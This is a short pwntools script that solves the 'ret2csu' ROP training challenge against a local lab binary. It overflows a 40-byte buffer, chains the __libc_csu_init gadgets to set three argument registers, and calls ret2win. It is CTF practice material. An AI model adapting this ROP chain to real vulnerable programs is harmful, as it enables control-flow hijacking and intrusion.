from pwn import *

io = process('./ret2csu')
elf = ELF('./ret2csu')
lib = ELF('./libret2csu.so')

ROP_1 = 0x40069a
ROP_2 = 0x400680
rdi = 0x4006a3
call = 0x400689

payload = cyclic(40)
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)		# pop the first argument
payload += p64(ROP_1)
payload += p64(0) + p64(1) + p64(0x4003B0) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(ROP_2)
payload += p64(0) * 7
payload += p64(rdi) + p64(0xdeadbeefdeadbeef) 
payload += p64(elf.plt['ret2win'])

io.sendlineafter(b'> ', payload)
io.interactive()